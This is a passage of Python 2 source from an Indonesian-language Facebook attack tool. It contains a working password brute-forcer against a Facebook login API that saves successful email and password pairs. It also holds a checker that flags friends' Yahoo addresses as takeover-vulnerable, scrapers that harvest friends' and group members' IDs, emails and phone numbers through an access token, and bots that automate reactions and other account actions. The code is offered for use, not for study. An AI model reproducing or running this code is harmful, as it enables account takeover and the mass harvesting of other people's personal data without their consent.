                    sys.stdout.flush()
                    data = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + email + '&locale=en_US&password=' + pw + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    mpsh = json.loads(data.text)
                    if 'access_token' in mpsh:
                        dapat = open('Brute.txt', 'w')
                        dapat.write(email + ' | ' + pw + '\n')
                        dapat.close()
                        print '\n\x1b[1;91m[+] \x1b[1;92mDitemukan.'
                        print 40 * '\x1b[1;97m\xe2\x95\x90'
                        print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername \x1b[1;91m:\x1b[1;97m ' + email
                        print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword \x1b[1;91m:\x1b[1;97m ' + pw
                        keluar()
                    else:
                        if 'www.facebook.com' in mpsh['error_msg']:
                            ceks = open('Brutecekpoint.txt', 'w')
                            ceks.write(email + ' | ' + pw + '\n')
                            ceks.close()
                            print '\n\x1b[1;91m[+] \x1b[1;92mDitemukan.'
                            print 40 * '\x1b[1;97m\xe2\x95\x90'
                            print '\x1b[1;91m[!] \x1b[1;93mAkun kena Checkpoint'
                            print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername \x1b[1;91m:\x1b[1;97m ' + email
                            print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword \x1b[1;91m:\x1b[1;97m ' + pw
                            keluar()
                except requests.exceptions.ConnectionError:
                    print '\x1b[1;91m[!] Koneksi Error'
                    time.sleep(1)

        except IOError:
            print '\x1b[1;91m[!] File tidak ditemukan...'
            print '\n\x1b[1;91m[!] \x1b[1;92mSepertinya kamu tidak memiliki wordlist'
            tanyaw()


def tanyaw():
    why = raw_input('\x1b[1;91m[?] \x1b[1;92mIngin membuat wordlist ? \x1b[1;92m[y/t]\x1b[1;91m:\x1b[1;97m ')
    if why == '':
        print '\x1b[1;91m[!] Tolong select \x1b[1;97m(y/t)'
        tanyaw()
    else:
        if why == 'y':
            wordlist()
        else:
            if why == 'Y':
                wordlist()
            else:
                if why == 't':
                    menu_hack()
                else:
                    if why == 'T':
                        menu_hack()
                    else:
                        print '\x1b[1;91m[!] Tolong select \x1b[1;97m(y/t)'
                        tanyaw()


def menu_yahoo():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    os.system('clear')
    print logo
    print 40 * '\x1b[1;97m\xe2\x95\x90'
    print '\x1b[1;37;40m1. Dari teman facebook'
    print '\x1b[1;37;40m2. Gunakan File'
    print '\x1b[1;31;40m0. Back'
    print
    yahoo_select()


def yahoo_select():
    go = raw_input('\x1b[1;91m-\xe2\x96\xba\x1b[1;97m ')
    if go == '':
        print '\x1b[1;91m[!] Jangan kosong'
        yahoo_select()
    else:
        if go == '1':
            yahoofriends()
        else:
            if go == '2':
                yahoolist()
            else:
                if go == '0':
                    menu_hack()
                else:
                    print '\x1b[1;91m[\xe2\x9c\x96] \x1b[1;97m' + go + ' \x1b[1;91mThere is nothing'
                    yahoo_select()


def yahoofriends():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    os.system('clear')
    print logo
    print 40 * '\x1b[1;97m\xe2\x95\x90'
    mpsh = []
    jml = 0
    jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mWait a minute \x1b[1;97m...')
    teman = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
    kimak = json.loads(teman.text)
    save = open('MailVuln.txt', 'w')
    print 40 * '\x1b[1;97m\xe2\x95\x90'
    for w in kimak['data']:
        jml += 1
        mpsh.append(jml)
        id = w['id']
        nama = w['name']
        links = requests.get('https://graph.facebook.com/' + id + '?access_token=' + toket)
        z = json.loads(links.text)
        try:
            mail = z['email']
            yahoo = re.compile('@.*')
            otw = yahoo.search(mail).group()
            if 'yahoo.com' in otw:
                br.open('https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com')
                br._factory.is_html = True
                br.select_form(nr=0)
                br['username'] = mail
                klik = br.submit().read()
                jok = re.compile('"messages.ERROR_INVALID_USERNAME">.*')
                try:
                    pek = jok.search(klik).group()
                except:
                    print '\x1b[1;91m[\xe2\x9c\x96] \x1b[1;92mEmail \x1b[1;91m:\x1b[1;91m ' + mail + ' \x1b[1;97m[\x1b[1;92m' + vulnot + '\x1b[1;97m]'
                    continue

                if '"messages.ERROR_INVALID_USERNAME">' in pek:
                    save.write(mail + '\n')
                    print 40 * '\x1b[1;97m\xe2\x95\x90'
                    print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mNama  \x1b[1;91m:\x1b[1;97m ' + nama
                    print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mID    \x1b[1;91m:\x1b[1;97m ' + id
                    print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mEmail \x1b[1;91m:\x1b[1;97m ' + mail + ' [\x1b[1;92m' + vuln + '\x1b[1;97m]'
                    print 40 * '\x1b[1;97m\xe2\x95\x90'
                else:
                    print '\x1b[1;91m[\xe2\x9c\x96] \x1b[1;92mEmail \x1b[1;91m:\x1b[1;91m ' + mail + ' \x1b[1;97m[\x1b[1;92m' + vulnot + '\x1b[1;97m]'
        except KeyError:
            pass

    print '\n\x1b[1;91m[+] \x1b[1;97mSelesai'
    print '\x1b[1;91m[+] \x1b[1;97mTersimpan \x1b[1;91m:\x1b[1;97m MailVuln.txt'
    save.close()
    raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
    menu_yahoo()


def yahoolist():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        os.system('clear')
        print logo
        print 40 * '\x1b[1;97m\xe2\x95\x90'
        files = raw_input('\x1b[1;91m[+] \x1b[1;92mFile \x1b[1;91m: \x1b[1;97m')
        try:
            total = open(files, 'r')
            mail = total.readlines()
        except IOError:
            print '\x1b[1;91m[!] File There is nothing'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            menu_yahoo()

    mpsh = []
    jml = 0
    jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mWait a minute \x1b[1;97m...')
    save = open('MailVuln.txt', 'w')
    print 40 * '\x1b[1;97m\xe2\x95\x90'
    print '\x1b[1;91m[?] \x1b[1;97mStatus \x1b[1;91m:  \x1b[1;97mRed[\x1b[1;92m' + vulnot + '\x1b[1;97m]  Green[\x1b[1;92m' + vuln + '\x1b[1;97m]'
    print
    mail = open(files, 'r').readlines()
    for pw in mail:
        mail = pw.replace('\n', '')
        jml += 1
        mpsh.append(jml)
        yahoo = re.compile('@.*')
        otw = yahoo.search(mail).group()
        if 'yahoo.com' in otw:
            br.open('https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com')
            br._factory.is_html = True
            br.select_form(nr=0)
            br['username'] = mail
            klik = br.submit().read()
            jok = re.compile('"messages.ERROR_INVALID_USERNAME">.*')
            try:
                pek = jok.search(klik).group()
            except:
                print '\x1b[1;91m ' + mail
                continue

            if '"messages.ERROR_INVALID_USERNAME">' in pek:
                save.write(mail + '\n')
                print '\x1b[1;92m ' + mail
            else:
                print '\x1b[1;91m ' + mail

    print '\n\x1b[1;91m[+] \x1b[1;97mSelesai'
    print '\x1b[1;91m[+] \x1b[1;97mTersimpan \x1b[1;91m:\x1b[1;97m MailVuln.txt'
    save.close()
    raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
    menu_yahoo()


def grab():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    os.system('clear')
    print logo
    print 40 * '\x1b[1;97m\xe2\x95\x90'
    print '\x1b[1;37;40m1. Ambil ID teman'
    print '\x1b[1;37;40m2. Ambil ID teman dari teman'
    print '\x1b[1;37;40m3. Ambil ID member GRUP'
    print '\x1b[1;37;40m4. Ambil Email teman'
    print '\x1b[1;37;40m5. Ambil Email teman dari teman'
    print '\x1b[1;37;40m6. Ambil No HP teman'
    print '\x1b[1;37;40m7. Ambil No HP teman dari teman'
    print '\x1b[1;31;40m0. Back'
    print
    grab_select()


def grab_select():
    cuih = raw_input('\x1b[1;91m-\xe2\x96\xba\x1b[1;97m ')
    if cuih == '':
        print '\x1b[1;91m[!] Jangan kosong'
        grab_select()
    else:
        if cuih == '1':
            id_teman()
        else:
            if cuih == '2':
                idfrom_teman()
            else:
                if cuih == '3':
                    id_member_grup()
                else:
                    if cuih == '4':
                        email()
                    else:
                        if cuih == '5':
                            emailfrom_teman()
                        else:
                            if cuih == '6':
                                nomor_hp()
                            else:
                                if cuih == '7':
                                    hpfrom_teman()
                                else:
                                    if cuih == '0':
                                        menu_hack()
                                    else:
                                        print '\x1b[1;91m[\xe2\x9c\x96] \x1b[1;97m' + cuih + ' \x1b[1;91mThere is nothing'
                                        grab_select()


def id_teman():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        try:
            os.system('clear')
            print logo
            print 40 * '\x1b[1;97m\xe2\x95\x90'
            r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
            z = json.loads(r.text)
            save_id = raw_input('\x1b[1;91m[+] \x1b[1;92mSimpan File \x1b[1;97mext(file.txt) \x1b[1;91m: \x1b[1;97m')
            bz = open(save_id, 'w')
            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mWait a minute \x1b[1;97m...')
            print 40 * '\x1b[1;97m\xe2\x95\x90'
            for ah in z['data']:
                idteman.append(ah['id'])
                bz.write(ah['id'] + '\n')
                print '\r\x1b[1;92mNama\x1b[1;91m  :\x1b[1;97m ' + ah['name']
                print '\x1b[1;92mID   \x1b[1;91m : \x1b[1;97m' + ah['id']
                print 40 * '\x1b[1;97m\xe2\x95\x90'

            print '\n\r\x1b[1;91m[+] \x1b[1;97mJumlah ID \x1b[1;96m%s' % len(idteman)
            print '\x1b[1;91m[+] \x1b[1;97mFile tersimpan \x1b[1;91m: \x1b[1;97m' + save_id
            bz.close()
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            grab()
        except IOError:
            print '\x1b[1;91m[!] Kesalahan saat membuat file'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            grab()
        except (KeyboardInterrupt, EOFError):
            print '\x1b[1;91m[!] Terhenti'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            grab()
        except KeyError:
            os.remove(save_id)
            print '\x1b[1;91m[!] Kesalahan terjadi'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            grab()
        except requests.exceptions.ConnectionError:
            print '\x1b[1;91m[\xe2\x9c\x96] There is nothing koneksi'
            keluar()


def idfrom_teman():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        try:
            os.system('clear')
            print logo
            print 40 * '\x1b[1;97m\xe2\x95\x90'
            idt = raw_input('\x1b[1;91m[+] \x1b[1;92mMasukan ID Teman \x1b[1;91m: \x1b[1;97m')
            try:
                jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
                op = json.loads(jok.text)
                print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mFrom\x1b[1;91m :\x1b[1;97m ' + op['name']
            except KeyError:
                print '\x1b[1;91m[!] Belum berteman'
                raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
                grab()

            r = requests.get('https://graph.facebook.com/' + idt + '?fields=friends.limit(5000)&access_token=' + toket)
            z = json.loads(r.text)
            save_idt = raw_input('\x1b[1;91m[+] \x1b[1;92mSimpan File \x1b[1;97mext(file.txt) \x1b[1;91m: \x1b[1;97m')
            bz = open(save_idt, 'w')
            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mWait a minute \x1b[1;97m...')
            print 40 * '\x1b[1;97m\xe2\x95\x90'
            for ah in z['friends']['data']:
                idfromteman.append(ah['id'])
                bz.write(ah['id'] + '\n')
                print '\r\x1b[1;92mNama\x1b[1;91m  :\x1b[1;97m ' + ah['name']
                print '\x1b[1;92mID   \x1b[1;91m : \x1b[1;97m' + ah['id']
                print 40 * '\x1b[1;97m\xe2\x95\x90'

            print '\n\r\x1b[1;91m[+] \x1b[1;97mJumlah ID \x1b[1;96m%s' % len(idfromteman)
            print '\x1b[1;91m[+] \x1b[1;97mFile tersimpan \x1b[1;91m: \x1b[1;97m' + save_idt
            bz.close()
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            grab()
        except IOError:
            print '\x1b[1;91m[!] Kesalahan saat membuat file'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            grab()
        except (KeyboardInterrupt, EOFError):
            print '\x1b[1;91m[!] Terhenti'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            grab()
        except requests.exceptions.ConnectionError:
            print '\x1b[1;91m[\xe2\x9c\x96] There is nothing koneksi'
            keluar()


def id_member_grup():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        try:
            os.system('clear')
            print logo
            print 40 * '\x1b[1;97m\xe2\x95\x90'
            id = raw_input('\x1b[1;91m[+] \x1b[1;92mID grup \x1b[1;91m:\x1b[1;97m ')
            try:
                r = requests.get('https://graph.facebook.com/group/?id=' + id + '&access_token=' + toket)
                asw = json.loads(r.text)
                print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mNama grup \x1b[1;91m:\x1b[1;97m ' + asw['name']
            except KeyError:
                print '\x1b[1;91m[!] Grup tidak ditemukan'
                raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
                grab()

            simg = raw_input('\x1b[1;91m[+] \x1b[1;97mSimpan File \x1b[1;97mext(file.txt) \x1b[1;91m: \x1b[1;97m')
            b = open(simg, 'w')
            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mWait a minute \x1b[1;97m...')
            print 40 * '\x1b[1;97m\xe2\x95\x90'
            re = requests.get('https://graph.facebook.com/' + id + '/members?fields=name,id&access_token=' + toket)
            s = json.loads(re.text)
            for i in s['data']:
                idmem.append(i['id'])
                b.write(i['id'] + '\n')
                print '\r\x1b[1;92mNama\x1b[1;91m  :\x1b[1;97m ' + i['name']
                print '\x1b[1;92mID  \x1b[1;91m  :\x1b[1;97m ' + i['id']
                print 40 * '\x1b[1;97m\xe2\x95\x90'

            print '\n\r\x1b[1;91m[+] \x1b[1;97mJumlah ID \x1b[1;96m%s' % len(idmem)
            print '\x1b[1;91m[+] \x1b[1;97mFile tersimpan \x1b[1;91m: \x1b[1;97m' + simg
            b.close()
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            grab()
        except IOError:
            print '\x1b[1;91m[!] Kesalahan saat membuat file'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            grab()
        except (KeyboardInterrupt, EOFError):
            print '\x1b[1;91m[!] Terhenti'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            grab()
        except KeyError:
            os.remove(simg)
            print '\x1b[1;91m[!] Grup tidak ditemukan'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            grab()
        except requests.exceptions.ConnectionError:
            print '\x1b[1;91m[\xe2\x9c\x96] There is nothing koneksi'
            keluar()


def email():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        try:
            os.system('clear')
            print logo
            print 40 * '\x1b[1;97m\xe2\x95\x90'
            mails = raw_input('\x1b[1;91m[+] \x1b[1;92mSimpan File \x1b[1;97mext(file.txt) \x1b[1;91m: \x1b[1;97m')
            r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
            a = json.loads(r.text)
            mpsh = open(mails, 'w')
            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mWait a minute \x1b[1;97m...')
            print 40 * '\x1b[1;97m\xe2\x95\x90'
            for i in a['data']:
                x = requests.get('https://graph.facebook.com/' + i['id'] + '?access_token=' + toket)
                z = json.loads(x.text)
                try:
                    em.append(z['email'])
                    mpsh.write(z['email'] + '\n')
                    print '\r\x1b[1;92mNama\x1b[1;91m  :\x1b[1;97m ' + z['name']
                    print '\x1b[1;92mEmail\x1b[1;91m : \x1b[1;97m' + z['email']
                    print 40 * '\x1b[1;97m\xe2\x95\x90'
                except KeyError:
                    pass

            print '\n\r\x1b[1;91m[+] \x1b[1;97mJumlah Email\x1b[1;96m%s' % len(em)
            print '\x1b[1;91m[+] \x1b[1;97mFile tersimpan \x1b[1;91m: \x1b[1;97m' + mails
            mpsh.close()
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            grab()
        except IOError:
            print '\x1b[1;91m[!] Kesalahan saat membuat file'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            grab()
        except (KeyboardInterrupt, EOFError):
            print '\x1b[1;91m[!] Terhenti'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            grab()
        except KeyError:
            os.remove(mails)
            print '\x1b[1;91m[!] Kesalahan terjadi'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            grab()
        except requests.exceptions.ConnectionError:
            print '\x1b[1;91m[\xe2\x9c\x96] There is nothing koneksi'
            keluar()


def emailfrom_teman():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        try:
            os.system('clear')
            print logo
            print 40 * '\x1b[1;97m\xe2\x95\x90'
            idt = raw_input('\x1b[1;91m[+] \x1b[1;92mMasukan ID Teman \x1b[1;91m: \x1b[1;97m')
            try:
                jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
                op = json.loads(jok.text)
                print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mFrom\x1b[1;91m :\x1b[1;97m ' + op['name']
            except KeyError:
                print '\x1b[1;91m[!] Belum berteman'
                raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
                grab()

            mails = raw_input('\x1b[1;91m[+] \x1b[1;92mSimpan File \x1b[1;97mext(file.txt) \x1b[1;91m: \x1b[1;97m')
            r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + toket)
            a = json.loads(r.text)
            mpsh = open(mails, 'w')
            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mWait a minute \x1b[1;97m...')
            print 40 * '\x1b[1;97m\xe2\x95\x90'
            for i in a['data']:
                x = requests.get('https://graph.facebook.com/' + i['id'] + '?access_token=' + toket)
                z = json.loads(x.text)
                try:
                    emfromteman.append(z['email'])
                    mpsh.write(z['email'] + '\n')
                    print '\r\x1b[1;92mNama\x1b[1;91m  :\x1b[1;97m ' + z['name']
                    print '\x1b[1;92mEmail\x1b[1;91m : \x1b[1;97m' + z['email']
                    print 40 * '\x1b[1;97m\xe2\x95\x90'
                except KeyError:
                    pass

            print '\n\r\x1b[1;91m[+] \x1b[1;97mJumlah Email\x1b[1;96m%s' % len(emfromteman)
            print '\x1b[1;91m[+] \x1b[1;97mFile tersimpan \x1b[1;91m: \x1b[1;97m' + mails
            mpsh.close()
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            grab()
        except IOError:
            print '\x1b[1;91m[!] Kesalahan saat membuat file'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            grab()
        except (KeyboardInterrupt, EOFError):
            print '\x1b[1;91m[!] Terhenti'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            grab()
        except requests.exceptions.ConnectionError:
            print '\x1b[1;91m[\xe2\x9c\x96] There is nothing koneksi'
            keluar()


def nomor_hp():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        try:
            os.system('clear')
            print logo
            print 40 * '\x1b[1;97m\xe2\x95\x90'
            noms = raw_input('\x1b[1;91m[+] \x1b[1;92mSimpan File \x1b[1;97mext(file.txt) \x1b[1;91m: \x1b[1;97m')
            url = 'https://graph.facebook.com/me/friends?access_token=' + toket
            r = requests.get(url)
            z = json.loads(r.text)
            no = open(noms, 'w')
            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mWait a minute \x1b[1;97m...')
            print 40 * '\x1b[1;97m\xe2\x95\x90'
            for n in z['data']:
                x = requests.get('https://graph.facebook.com/' + n['id'] + '?access_token=' + toket)
                z = json.loads(x.text)
                try:
                    hp.append(z['mobile_phone'])
                    no.write(z['mobile_phone'] + '\n')
                    print '\r\x1b[1;92mNama\x1b[1;91m  :\x1b[1;97m ' + z['name']
                    print '\x1b[1;92mNomor\x1b[1;91m : \x1b[1;97m' + z['mobile_phone']
                    print 40 * '\x1b[1;97m\xe2\x95\x90'
                except KeyError:
                    pass

            print '\n\r\x1b[1;91m[+] \x1b[1;97mJumlah Nomor\x1b[1;96m%s' % len(hp)
            print '\x1b[1;91m[+] \x1b[1;97mFile tersimpan \x1b[1;91m: \x1b[1;97m' + noms
            no.close()
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            grab()
        except IOError:
            print '\x1b[1;91m[!] Kesalahan saat membuat file'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            grab()
        except (KeyboardInterrupt, EOFError):
            print '\x1b[1;91m[!] Terhenti'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            grab()
        except KeyError:
            os.remove(noms)
            print '\x1b[1;91m[!] Kesalahan terjadi'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            grab()
        except requests.exceptions.ConnectionError:
            print '\x1b[1;91m[\xe2\x9c\x96] There is nothing koneksi'
            keluar()


def hpfrom_teman():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        try:
            os.system('clear')
            print logo
            print 40 * '\x1b[1;97m\xe2\x95\x90'
            idt = raw_input('\x1b[1;91m[+] \x1b[1;92mMasukan ID Teman \x1b[1;91m: \x1b[1;97m')
            try:
                jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
                op = json.loads(jok.text)
                print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mFrom\x1b[1;91m :\x1b[1;97m ' + op['name']
            except KeyError:
                print '\x1b[1;91m[!] Belum berteman'
                raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
                grab()

            noms = raw_input('\x1b[1;91m[+] \x1b[1;92mSimpan File \x1b[1;97mext(file.txt) \x1b[1;91m: \x1b[1;97m')
            r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + toket)
            a = json.loads(r.text)
            no = open(noms, 'w')
            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mWait a minute \x1b[1;97m...')
            print 40 * '\x1b[1;97m\xe2\x95\x90'
            for i in a['data']:
                x = requests.get('https://graph.facebook.com/' + i['id'] + '?access_token=' + toket)
                z = json.loads(x.text)
                try:
                    hpfromteman.append(z['mobile_phone'])
                    no.write(z['mobile_phone'] + '\n')
                    print '\r\x1b[1;92mNama\x1b[1;91m  :\x1b[1;97m ' + z['name']
                    print '\x1b[1;92mNomor\x1b[1;91m : \x1b[1;97m' + z['mobile_phone']
                    print 40 * '\x1b[1;97m\xe2\x95\x90'
                except KeyError:
                    pass

            print '\n\r\x1b[1;91m[+] \x1b[1;97mJumlah Nomor\x1b[1;96m%s' % len(hpfromteman)
            print '\x1b[1;91m[+] \x1b[1;97mFile tersimpan \x1b[1;91m: \x1b[1;97m' + noms
            no.close()
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            grab()
        except IOError:
            print '\x1b[1;91m[!] Kesalahan saat membuat file'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            grab()
        except (KeyboardInterrupt, EOFError):
            print '\x1b[1;91m[!] Terhenti'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            grab()
        except requests.exceptions.ConnectionError:
            print '\x1b[1;91m[\xe2\x9c\x96] There is nothing koneksi'
            keluar()


def menu_bot():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    os.system('clear')
    print logo
    print 40 * '\x1b[1;97m\xe2\x95\x90'
    print '\x1b[1;37;40m1. Bot Reactions Target Post'
    print '\x1b[1;37;40m2. Bot Reactions Grup Post'
    print '\x1b[1;37;40m3. Bot Komen Target Post'
    print '\x1b[1;37;40m4. Bot Komen Grup Post'
    print '\x1b[1;37;40m5. Mass delete Post'
    print '\x1b[1;37;40m6. Terima permintaan pertemanan'
    print '\x1b[1;37;40m7. Hapus pertemanan'
    print '\x1b[1;31;40m0. Back'
    print
    bot_select()


def bot_select():
    bots = raw_input('\x1b[1;91m-\xe2\x96\xba\x1b[1;97m ')
    if bots == '':
        print '\x1b[1;91m[!] Jangan kosong'
        bot_select()
    else:
        if bots == '1':
            menu_react()
        else:
            if bots == '2':
                grup_react()
            else:
                if bots == '3':
                    bot_komen()
                else:
                    if bots == '4':
                        grup_komen()
                    else:
                        if bots == '5':
                            deletepost()
                        else:
                            if bots == '6':
                                accept()
                            else:
                                if bots == '7':
                                    unfriend()
                                else:
                                    if bots == '0':
                                        menu()
                                    else:
                                        print '\x1b[1;91m[\xe2\x9c\x96] \x1b[1;97m' + bots + ' \x1b[1;91mThere is nothing'
                                        bot_select()


def menu_react():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    os.system('clear')
    print logo
    print 40 * '\x1b[1;97m\xe2\x95\x90'
    print '\x1b[1;37;40m1. \x1b[1;97mLike'
    print '\x1b[1;37;40m2. \x1b[1;97mLove'
    print '\x1b[1;37;40m3. \x1b[1;97mWow'
    print '\x1b[1;37;40m4. \x1b[1;97mHaha'
    print '\x1b[1;37;40m5. \x1b[1;97mSedih'
    print '\x1b[1;37;40m6. \x1b[1;97mMarah'
    print '\x1b[1;31;40m0. Back'
    print
    react_select()


def react_select():
    global tipe
    aksi = raw_input('\x1b[1;91m-\xe2\x96\xba\x1b[1;97m ')
    if aksi == '':
        print '\x1b[1;91m[!] Jangan kosong'
        react_select()
    else:
        if aksi == '1':
            tipe = 'LIKE'
            react()
        else:
            if aksi == '2':
                tipe = 'LOVE'
                react()
            else:
                if aksi == '3':
                    tipe = 'WOW'
                    react()
                else:
                    if aksi == '4':
                        tipe = 'HAHA'
                        react()
                    else:
                        if aksi == '5':
                            tipe = 'SAD'
                            react()
                        else:
                            if aksi == '6':
                                tipe = 'ANGRY'
                                react()
                            else:
                                if aksi == '0':
                                    menu_bot()
                                else:
                                    print '\x1b[1;91m[\xe2\x9c\x96] \x1b[1;97m' + aksi + ' \x1b[1;91mThere is nothing'
                                    react_select()


def react():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        os.system('clear')
        print logo
        print 40 * '\x1b[1;97m\xe2\x95\x90'
        ide = raw_input('\x1b[1;91m[+] \x1b[1;92mID Target \x1b[1;91m:\x1b[1;97m ')
        limit = raw_input('\x1b[1;91m[!] \x1b[1;92mLimit \x1b[1;91m:\x1b[1;97m ')
        try:
            oh = requests.get('https://graph.facebook.com/' + ide + '?fields=feed.limit(' + limit + ')&access_token=' + toket)
            ah = json.loads(oh.text)
            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mWait a minute \x1b[1;97m...')
            print 40 * '\x1b[1;97m\xe2\x95\x90'
            for a in ah['feed']['data']:
                y = a['id']
                reaksi.append(y)
                requests.post('https://graph.facebook.com/' + y + '/reactions?type=' + tipe + '&access_token=' + toket)
                print '\x1b[1;92m[\x1b[1;97m' + y[:10].replace('\n', ' ') + '... \x1b[1;92m] \x1b[1;97m' + tipe

            print
